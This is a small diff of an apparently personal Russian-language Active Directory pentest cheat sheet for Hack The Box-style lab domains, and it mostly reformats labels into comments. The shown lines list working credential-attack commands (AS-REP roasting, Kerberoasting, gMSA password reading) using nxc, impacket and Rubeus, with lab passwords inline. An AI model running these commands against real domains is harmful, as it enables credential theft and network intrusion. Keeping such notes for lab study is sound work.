@@ -76,7 +76,8 @@
 		(получение krb5.conf) nxc smb dc01.mirage.htb -d mirage.htb -k --generate-krb5-file krb5.conf
 		sudo mv krb5.conf /etc/krb5.conf
 		
-  		(asreproasting)	nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
+  # (asreproasting)	
+  		nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
 
 		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
 		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
@@ -91,7 +92,8 @@
 		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
 
 		
-		(керберостинг с nxc) nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
+# (керберостинг с nxc) 
+		nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
 		# Перечисление учетных записей с привилегиями gMSA
 		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
 		(чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
